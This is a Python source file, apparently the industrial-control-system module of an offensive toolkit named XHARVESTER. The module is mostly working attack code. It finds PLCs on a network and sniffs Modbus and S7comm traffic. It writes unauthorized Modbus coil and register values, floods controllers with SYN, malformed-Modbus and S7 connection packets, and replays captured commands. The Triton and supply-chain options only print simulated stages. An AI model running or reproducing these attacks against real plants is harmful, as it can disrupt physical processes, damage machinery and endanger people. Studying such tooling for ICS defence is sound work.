#!/usr/bin/env python
import os
import time
import socket
import random
import threading
import struct
from typing import List, Dict, Any, Optional
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import send, sniff

# Color codes
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[31m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
LIGHTCYAN_EX = '\033[96m'
BLACK = '\x1b[30m'
RESET = '\033[0m'

# Configuration
ANIMATION_SPEED = 0.005
ICS_PORTS = [502, 102, 20000, 44818, 2404, 47808, 1911, 4911]  # Common ICS ports

class ICSModule:
    def __init__(self):
        self.hostname = self.get_hostname()
        self.sniffing = False
        self.attack_active = False
        self.modbus_target = None
        self.s7_target = None
        self.discovered_devices = {}
        self.captured_packets = []
        self.sniff_thread = None

    ### Utility Methods ###
    def print_status(self, message: str) -> None:
        """Print status messages"""
        print(f"{GREEN}[✚]{RESET} {message}")

    def print_warning(self, message: str) -> None:
        """Print warning messages"""
        print(f"{YELLOW}[❕️]{RESET} {message}")

    def print_error(self, message: str) -> None:
        """Print error messages"""
        print(f"{RED}[━]{RESET} {message}")

    def print_info(self, message: str) -> None:
        """Print info messages"""
        print(f"{CYAN}[ℹ]{RESET} {message}")

    ### Text Animation ###
    def text_animation(self):
        banner_text = f"""{MAGENTA}
  _  _  _   _    __    ____  _  _  ____  ___  ____  ____  ____ {RED}
 ( \/ )( )_( )  /__\  (  _ \( \/ )( ___)/ __)(_  _)( ___)(  _ \\{MAGENTA}
  )  (  ) _ (  /(__)\  )   / \  /  )__) \__ \  )(   )__)  )   /{RED}
 (_/\_)(_) (_)(__)(__)(_)\_)  \/  (____)(___/ (__) (____)(_)\_)
        {RESET}"""

        for char in banner_text:
            print(char, end='', flush=True)
            time.sleep(ANIMATION_SPEED)
        print(f"\n{CYAN} >>> Extended Reconnaissance & Exploitation Toolkit For Newbies <<<{RESET}")
        print(f"{GREEN}| GitHub:{RESET}{YELLOW} @n3tworkh4x |{RESET}{MAGENTA} Ko-fi{YELLOW}(Donation):{RESET}{GREEN} https://ko-fi.com/n3twork |")
        print(f"\t\t{YELLOW}ℬ y{GREEN} 𝓝𝓮𝓽𝔀𝓸𝓻𝓴({RED}G{YELLOW}H{GREEN}A{BLACK}N{RED}A)\t\t\t")
        print(f"{RED} Use only for authorized security testing!{RESET}")

    def clear_screen(self) -> None:
        os.system('cls' if os.name == 'nt' else 'clear')

    def get_hostname(self) -> str:
        try:
            return socket.gethostname()
        except:
            return "unknown"

    ### ICS Network Reconnaissance ###
    def scan_ics_network(self, network_range: str = "192.168.1.0/24") -> Dict[str, List[int]]:
        """Scan for ICS devices on the network"""
        self.print_status(f"Scanning for ICS devices on {network_range}...")
        
        # Create ARP request packet
        arp_request = ARP(pdst=network_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        # Send packets and capture responses
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        # Process responses
        devices = {}
        for element in answered_list:
            ip = element[1].psrc
            mac = element[1].hwsrc
            
            # Check for open ICS ports
            open_ports = []
            for port in ICS_PORTS:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
            
            if open_ports:
                devices[ip] = {
                    "mac": mac,
                    "ports": open_ports,
                    "vendor": self.get_vendor_from_mac(mac)
                }
                self.print_info(f"Found ICS device: {ip} (MAC: {mac}) - Open ports: {open_ports}")
        
        self.discovered_devices = devices
        return devices

    def get_vendor_from_mac(self, mac: str) -> str:
        """Get vendor name from MAC address (simplified)"""
        # This is a simplified version - in practice you'd use a proper OUI database
        vendors = {
            "00:1D:9C": "Rockwell Automation",
            "00:0E:8C": "Siemens AG",
            "00:1C:06": "Schneider Electric",
            "00:30:A7": "Honeywell",
            "00:1B:1B": "Emerson Electric",
            "00:1E:52": "ABB Group"
        }
        
        for prefix, vendor in vendors.items():
            if mac.startswith(prefix):
                return vendor
        
        return "Unknown"

    def sniff_ics_traffic(self, interface: str = None, timeout: int = 30):
        """Sniff ICS network traffic"""
        self.print_status(f"Sniffing ICS traffic for {timeout} seconds...")
        
        # Filter for common ICS protocols
        filter_str = " or ".join([f"tcp port {port}" for port in ICS_PORTS])
        
        def packet_callback(packet):
            if packet.haslayer(TCP) and packet[TCP].dport in ICS_PORTS:
                self.captured_packets.append(packet)
                self.print_info(f"Captured packet: {packet.summary()}")
                
                # Try to identify protocol
                if packet[TCP].dport == 502:
                    self.analyze_modbus_packet(packet)
                elif packet[TCP].dport == 102:
                    self.analyze_s7comm_packet(packet)
        
        try:
            sniff(filter=filter_str, prn=packet_callback, timeout=timeout, iface=interface)
            self.print_status(f"Captured {len(self.captured_packets)} ICS packets")
        except Exception as e:
            self.print_error(f"Sniffing failed: {e}")

    def analyze_modbus_packet(self, packet):
        """Analyze Modbus TCP packet"""
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                # Simple Modbus TCP analysis
                raw_data = packet[Raw].load
                if len(raw_data) >= 7:  # Modbus TCP header is at least 7 bytes
                    trans_id = struct.unpack(">H", raw_data[0:2])[0]
                    proto_id = struct.unpack(">H", raw_data[2:4])[0]
                    length = struct.unpack(">H", raw_data[4:6])[0]
                    unit_id = raw_data[6]
                    func_code = raw_data[7] if len(raw_data) > 7 else None
                    
                    func_codes = {
                        1: "Read Coils",
                        2: "Read Discrete Inputs",
                        3: "Read Holding Registers",
                        4: "Read Input Registers",
                        5: "Write Single Coil",
                        6: "Write Single Register",
                        15: "Write Multiple Coils",
                        16: "Write Multiple Registers"
                    }
                    
                    func_name = func_codes.get(func_code, f"Unknown ({func_code})")
                    self.print_info(f"Modbus TCP: Transaction ID: {trans_id}, Function: {func_name}")
            except:
                pass

    def analyze_s7comm_packet(self, packet):
        """Analyze S7comm packet"""
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                # Simple S7comm analysis
                raw_data = packet[Raw].load
                if len(raw_data) >= 4:
                    # S7comm has a 4-byte header
                    protocol_id = raw_data[0]
                    if protocol_id == 0x32:  # S7comm
                        msg_type = raw_data[1]
                        msg_types = {
                            1: "Job",
                            2: "Ack",
                            3: "Ack-Data",
                            7: "Userdata"
                        }
                        msg_name = msg_types.get(msg_type, f"Unknown ({msg_type})")
                        self.print_info(f"S7comm: Message Type: {msg_name}")
            except:
                pass

    ### ICS Attack Implementations ###
    def modbus_command_injection(self, target_ip: str, target_port: int = 502):
        """Send unauthorized Modbus commands"""
        self.print_status(f"Attempting Modbus command injection to {target_ip}:{target_port}")
        
        # Craft malicious Modbus packets
        function_codes = {
            "Write Single Coil": 5,
            "Write Single Register": 6,
            "Write Multiple Coils": 15,
            "Write Multiple Registers": 16
        }
        
        print(f"\n{YELLOW}Available Modbus function codes:{RESET}")
        for i, (name, code) in enumerate(function_codes.items()):
            print(f"  [{i}] {name} (Code: {code})")
        
        try:
            choice = int(input(f"\n{GREEN}Select function code: {YELLOW}"))
            func_name = list(function_codes.keys())[choice]
            func_code = function_codes[func_name]
            
            # Get target address and value
            address = int(input(f"{GREEN}Enter target address: {YELLOW}"))
            value = int(input(f"{GREEN}Enter value to write: {YELLOW}"))
            
            # Craft Modbus packet
            if func_code in [5, 6]:  # Single write operations
                # Transaction ID, Protocol ID, Length, Unit ID, Function Code
                header = struct.pack(">HHHB", random.randint(1, 65535), 0, 6, 1)
                # Function code, Address, Value
                if func_code == 5:  # Write Single Coil
                    body = struct.pack(">BHH", func_code, address, 0xFF00 if value else 0x0000)
                else:  # Write Single Register
                    body = struct.pack(">BHH", func_code, address, value)
                
                packet = header + body
                
            elif func_code in [15, 16]:  # Multiple write operations
                # For simplicity, we'll just write one value
                quantity = 1
                byte_count = 1 if func_code == 15 else 2  # Coils vs registers
                
                # Transaction ID, Protocol ID, Length, Unit ID, Function Code
                header = struct.pack(">HHHB", random.randint(1, 65535), 0, 7 + byte_count, 1)
                # Function code, Address, Quantity, Byte Count, Value(s)
                if func_code == 15:  # Write Multiple Coils
                    body = struct.pack(">BHHB", func_code, address, quantity, byte_count)
                    body += struct.pack(">B", 0x01 if value else 0x00)
                else:  # Write Multiple Registers
                    body = struct.pack(">BHHB", func_code, address, quantity, byte_count)
                    body += struct.pack(">H", value)
                
                packet = header + body
            
            # Send the packet
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                sock.send(packet)
                
                # Try to receive response
                try:
                    response = sock.recv(1024)
                    self.print_info(f"Received response: {response.hex()}")
                except socket.timeout:
                    self.print_warning("No response received (timeout)")
                
                sock.close()
                self.print_status(f"Modbus {func_name} command sent to {target_ip}:{target_port}")
                
            except Exception as e:
                self.print_error(f"Failed to send Modbus command: {e}")
                
        except (ValueError, IndexError):
            self.print_error("Invalid selection")

    def ics_dos_attack(self, target_ip: str, target_port: int, attack_type: str, duration: int = 10):
        """Perform DoS attack on ICS device"""
        self.print_status(f"Starting {attack_type} DoS attack on {target_ip}:{target_port} for {duration} seconds")
        
        self.attack_active = True
        start_time = time.time()
        packet_count = 0
        
        # Craft attack packets based on type
        if attack_type == "TCP SYN Flood":
            # Craft SYN packets
            ip = IP(dst=target_ip)
            tcp = TCP(dport=target_port, flags="S")
            packet = ip / tcp
            
            while self.attack_active and (time.time() - start_time) < duration:
                send(packet, verbose=False)
                packet_count += 1
                if packet_count % 100 == 0:
                    print(f"  {RED}Sent {packet_count} SYN packets...{RESET}", end="\r")
                
        elif attack_type == "Modbus Exception Flood":
            # Craft malformed Modbus packets
            while self.attack_active and (time.time() - start_time) < duration:
                try:
                    # Random transaction ID, protocol ID, length, unit ID, invalid function code
                    header = struct.pack(">HHHB", random.randint(1, 65535), 0, 2, 1)
                    # Invalid function code
                    body = struct.pack(">B", random.randint(128, 255))  # Exception codes
                    packet = header + body
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((target_ip, target_port))
                    sock.send(packet)
                    sock.close()
                    
                    packet_count += 1
                    if packet_count % 50 == 0:
                        print(f"  {RED}Sent {packet_count} malformed Modbus packets...{RESET}", end="\r")
                        
                except:
                    pass
                
        elif attack_type == "S7comm Connection Flood":
            # Craft S7comm connection requests
            while self.attack_active and (time.time() - start_time) < duration:
                try:
                    # S7comm connection request (simplified)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((target_ip, target_port))
                    
                    # Send some data to initiate connection
                    sock.send(b"\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc1\x02\x01\x00\xc2\x02\x01\x02\xc0\x01\x09")
                    
                    packet_count += 1
                    if packet_count % 20 == 0:
                        print(f"  {RED}Sent {packet_count} S7 connection requests...{RESET}", end="\r")
                        
                except:
                    pass
        
        self.attack_active = False
        self.print_status(f"{attack_type} completed! Sent {packet_count} packets")

    def replay_attack(self, packets: List, target_ip: str, target_port: int, repeat: int = 5):
        """Replay captured packets"""
        self.print_status(f"Replaying {len(packets)} packets to {target_ip}:{target_port} (x{repeat})")
        
        for i in range(repeat):
            self.print_info(f"Replay iteration {i+1}/{repeat}")
            
            for packet in packets:
                if packet.haslayer(TCP) and packet.haslayer(IP):
                    # Modify the packet to target the specified IP and port
                    new_packet = packet.copy()
                    new_packet[IP].dst = target_ip
                    new_packet[TCP].dport = target_port
                    
                    # Recalculate checksums
                    del new_packet[IP].chksum
                    del new_packet[TCP].chksum
                    
                    # Send the packet
                    send(new_packet, verbose=False)
                    time.sleep(0.1)  # Small delay between packets
            
            self.print_info(f"Completed replay iteration {i+1}/{repeat}")
        
        self.print_status("Replay attack completed")

    ### Main Menu Handlers ###
    def handle_unauthorized_command_injection(self):
        """Handle unauthorized command injection workflow"""
        print(f"\n{GREEN}  Unauthorized Command Injection:{CYAN} Sending malicious commands to ICS devices like PLCs or RTUs.")
        print(f"{GREEN}  Impact:{CYAN} Can cause physical damage to machinery, unsafe operations, and production downtime.")
        print(f"{GREEN}  Protection:{CYAN} Implement strict access control, network segmentation, and use application whitelisting.{RESET}")
        
        # Scan for ICS devices first
        if not self.discovered_devices:
            network = input(f"{GREEN}Enter network range to scan [default: 192.168.1.0/24]: {YELLOW}") or "192.168.1.0/24"
            self.scan_ics_network(network)
        
        if not self.discovered_devices:
            self.print_error("No ICS devices found. Try manual target entry.")
            target_ip = input(f"{GREEN}Enter target IP address: {YELLOW}")
            target_port = int(input(f"{GREEN}Enter target port [default: 502]: {YELLOW}") or "502")
        else:
            print(f"\n{YELLOW}Discovered ICS devices:{RESET}")
            for i, (ip, info) in enumerate(self.discovered_devices.items()):
                print(f"  [{i}] {ip} (Ports: {info['ports']}, Vendor: {info['vendor']})")
            
            choice = input(f"{GREEN}Select device or enter manual IP: {YELLOW}")
            
            if choice.isdigit() and int(choice) < len(self.discovered_devices):
                target_ip = list(self.discovered_devices.keys())[int(choice)]
                ports = self.discovered_devices[target_ip]["ports"]
                target_port = ports[0] if ports else 502
            else:
                target_ip = choice
                target_port = int(input(f"{GREEN}Enter target port [default: 502]: {YELLOW}") or "502")
        
        # Check if it's a Modbus device
        if target_port == 502:
            self.modbus_command_injection(target_ip, target_port)
        else:
            self.print_warning(f"Automatic command injection not implemented for port {target_port}")
            self.print_info("Consider using a specialized tool for this protocol")

    def handle_dos_attack(self):
        """Handle DoS attack workflow"""
        print(f"\n{GREEN}  ICS DoS Attack:{CYAN} Flooding controllers or network channels to cripple operational technology (OT) networks.")
        print(f"{GREEN}  Impact:{CYAN} Halts production, disrupts critical monitoring, and can lead to unsafe plant conditions.")
        print(f"{GREEN}  Protection:{CYAN} Segment networks rigorously, prioritize ICS traffic, and deploy OT-specific intrusion detection systems.{RESET}")
        
        # Get target information
        target_ip = input(f"{GREEN}Target IP address: {YELLOW}")
        target_port = int(input(f"{GREEN}Target port [default: 502]: {YELLOW}") or "502")
        
        # Select attack type
        attack_types = [
            "TCP SYN Flood",
            "Modbus Exception Flood", 
            "S7comm Connection Flood"
        ]
        
        print(f"\n{YELLOW}Available DoS attack types:{RESET}")
        for i, attack_type in enumerate(attack_types):
            print(f"  [{i}] {attack_type}")
        
        try:
            choice = int(input(f"\n{GREEN}Select attack type: {YELLOW}"))
            attack_type = attack_types[choice]
            
            duration = int(input(f"{GREEN}Attack duration (seconds) [default: 10]: {YELLOW}") or "10")
            
            # Start the attack in a separate thread
            attack_thread = threading.Thread(
                target=self.ics_dos_attack, 
                args=(target_ip, target_port, attack_type, duration)
            )
            attack_thread.daemon = True
            attack_thread.start()
            
            # Wait for attack to complete or allow user to stop it
            self.print_info(f"Attack started. Press Enter to stop early or wait for completion.")
            input()
            self.attack_active = False
            self.print_status("Attack stopped by user")
            
        except (ValueError, IndexError):
            self.print_error("Invalid selection")

    def handle_replay_attack(self):
        """Handle replay attack workflow"""
        print(f"\n{GREEN}  ICS Replay Attack:{CYAN} Capturing and retransmitting legitimate operational commands to disrupt processes.")
        print(f"{GREEN}  Impact:{CYAN} Causes unexpected machine behavior, process anomalies, and potential safety incidents.")
        print(f"{GREEN}  Protection:{CYAN} Use protocols with sequence numbers or timestamps to prevent command replay.{RESET}")
        
        # First, capture some traffic
        if not self.captured_packets:
            interface = input(f"{GREEN}Network interface to sniff [default: None]: {YELLOW}") or None
            timeout = int(input(f"{GREEN}Sniffing duration (seconds) [default: 30]: {YELLOW}") or "30")
            self.sniff_ics_traffic(interface, timeout)
        
        if not self.captured_packets:
            self.print_error("No packets captured. Cannot perform replay attack.")
            return
        
        # Select target
        target_ip = input(f"{GREEN}Target IP address: {YELLOW}")
        target_port = int(input(f"{GREEN}Target port: {YELLOW}"))
        
        repeat = int(input(f"{GREEN}Number of times to repeat [default: 5]: {YELLOW}") or "5")
        
        # Filter packets for replay (only those with relevant protocols)
        replay_packets = []
        for packet in self.captured_packets:
            if packet.haslayer(TCP) and packet[TCP].dport in ICS_PORTS:
                replay_packets.append(packet)
        
        if not replay_packets:
            self.print_error("No relevant ICS packets captured for replay.")
            return
        
        self.print_info(f"Selected {len(replay_packets)} ICS packets for replay")
        self.replay_attack(replay_packets, target_ip, target_port, repeat)

    def handle_network_recon(self):
        """Handle network reconnaissance"""
        self.print_status("Starting ICS network reconnaissance")
        
        network = input(f"{GREEN}Enter network range to scan [default: 192.168.1.0/24]: {YELLOW}") or "192.168.1.0/24"
        self.scan_ics_network(network)
        
        if self.discovered_devices:
            # Offer to sniff traffic from discovered devices
            sniff_choice = input(f"{GREEN}Sniff traffic from discovered devices? (y/N): {YELLOW}").lower()
            if sniff_choice == 'y':
                interface = input(f"{GREEN}Network interface to sniff [default: None]: {YELLOW}") or None
                timeout = int(input(f"{GREEN}Sniffing duration (seconds) [default: 30]: {YELLOW}") or "30")
                self.sniff_ics_traffic(interface, timeout)

    ### Main Menu ###
    def main(self) -> None:
        time.sleep(0.05)
        active = True
        while active:
            self.clear_screen()
            self.text_animation()
            print(f"\n\t\t{LIGHTCYAN_EX} ︻芫═─── {RED}💥 {YELLOW}(▀̿Ĺ̯▀̿ ̿)\t\t\t\n")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            print(f"{GREEN}         {LIGHTCYAN_EX}🚀{RESET}{GREEN}   XHARVESTER -- ICS MENU   {LIGHTCYAN_EX}🕷️{GREEN}")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            print(f"{CYAN}\t[1] 💉 Unauthorized Command Injection")
            print(f"{CYAN}\t[2] 👽 ICS Malware (e.g., Triton)")
            print(f"{CYAN}\t[3] ⟲ ICS Replay Attack")
            print(f"{CYAN}\t[4] 🚫 ICS DoS Attack")
            print(f"{CYAN}\t[5] 🔗 Supply Chain Attack")
            print(f"{CYAN}\t[6] 📡 Network Reconnaissance")
            print(f"{CYAN}\t[7] 👂 Traffic Sniffing")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            print(f"{YELLOW}\t[0] ⇇ Back")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")  

            try:
                choice = input(f"\n  [💀] {GREEN}xharvester{YELLOW}@{RESET}{CYAN}{self.hostname}{RESET}{RED}:{RESET}{GREEN}~{RESET}{YELLOW}$ ")
            except (KeyboardInterrupt, EOFError):
                terminator = f"\n\n\t\t\t{MAGENTA}[💀]{RESET}{RED} Exiting・・・\n\n"
                for word in terminator:
                    print(word, end="", flush=True)
                    time.sleep(0.05)
                break
                    
            if choice == "0":
                mesg = f"{MAGENTA}\n\t\t\t[⇇]{YELLOW} Moving Back・・・\n\n"
                for word in mesg:
                    print(word, end="", flush=True)
                    time.sleep(0.05)
                active = False

            elif choice == "1":
                self.handle_unauthorized_command_injection()
            
            elif choice == "2":
                print(f"\n{GREEN}  ICS Malware (e.g., Triton):{CYAN} Malicious software specifically designed to target and disrupt industrial control systems.")
                print(f"{GREEN}  Impact:{CYAN} Safety system disablement, equipment hijacking, and potential physical destruction.")
                print(f"{GREEN}  Protection:{CYAN} Secure HMIs and workstations, use specialized ICS antivirus, and enforce air-gapping where possible.{RESET}")
                # This would be a simulation as in the original code
                self.ics_malware_simulation()

            elif choice == "3":
                self.handle_replay_attack()

            elif choice == "4":
                self.handle_dos_attack()

            elif choice == "5":
                print(f"\n{GREEN}  Supply Chain Attack:{CYAN} Introducing vulnerabilities into ICS systems through compromised firmware or vendor software.")
                print(f"{GREEN}  Impact:{CYAN} Provides a hidden backdoor for attackers, leading to widespread system compromise and data manipulation.")
                print(f"{GREEN}  Protection:{CYAN} Vet suppliers rigorously, verify firmware checksums, and maintain an isolated patch management network.{RESET}")
                # This would be a simulation as in the original code
                self.supply_chain_attack()

            elif choice == "6":
                self.handle_network_recon()

            elif choice == "7":
                interface = input(f"{GREEN}Network interface to sniff [default: None]: {YELLOW}") or None
                timeout = int(input(f"{GREEN}Sniffing duration (seconds) [default: 30]: {YELLOW}") or "30")
                self.sniff_ics_traffic(interface, timeout)

            else:
                error = f"\n\t\t\t{YELLOW}{choice} is not a valid option!\n"
                for word in error:
                    print(word, end="", flush=True)
                    time.sleep(0.05)
                
            if choice != "0":                
                input(f"\n  {GREEN}Press Enter to continue・・・")

    # Original simulation methods (kept for compatibility)
    def ics_malware_simulation(self):
        """Simulate ICS malware like Triton"""
        self.print_status("Starting ICS Malware (Triton) simulation")
        
        # Triton malware stages simulation
        stages = [
            "Initial reconnaissance and network mapping",
            "Lateral movement to engineering workstation",
            "Extraction of safety system configurations",
            "Deployment of malicious Triconex logic",
            "Disabling of safety instrumented systems",
            "Establishing persistent backdoor access"
        ]
        
        self.print_info("Simulating Triton malware attack stages:")
        for i, stage in enumerate(stages):
            print(f"  {GREEN}[{i+1}/{len(stages)}]{YELLOW} {stage}{RESET}")
            time.sleep(1.5)
            
        self.print_status("Triton malware simulation complete!")
        self.print_error("WARNING: Real ICS malware can disable safety systems and cause catastrophic failures!")

    def supply_chain_attack(self):
        """Simulate ICS supply chain attack"""
        self.print_status("Starting ICS Supply Chain Attack simulation")
        
        # Simulate supply chain compromise vectors
        vectors = [
            "Compromised vendor software update",
            "Backdoored firmware image",
            "Malicious hardware component",
            "Trojanized engineering software",
            "Compromised third-party library"
        ]
        
        print(f"\n{YELLOW}Supply chain attack vectors:{RESET}")
        for i, vector in enumerate(vectors):
            print(f"  [{i}] {vector}")
        
        try:
            choice = int(input(f"\n{GREEN}Select attack vector: {YELLOW}"))
            vector = vectors[choice]
            
            self.print_info(f"Simulating {vector} supply chain attack...")
            
            # Simulate attack stages
            stages = [
                "Initial compromise of vendor systems",
                "Insertion of malicious code into product",
                "Distribution to multiple customers",
                "Activation of malicious functionality",
                "Establishment of covert C2 channels"
            ]
            
            for stage in stages:
                print(f"  {YELLOW}→ {stage}{RESET}")
                time.sleep(1.5)
                
            self.print_status("Supply chain attack simulation complete!")
            self.print_error("WARNING: Real supply chain attacks are difficult to detect and can affect multiple sites!")
            
        except (ValueError, IndexError):
            self.print_error("Invalid selection")

if __name__ == "__main__":
    ics = ICSModule()
    ics.main()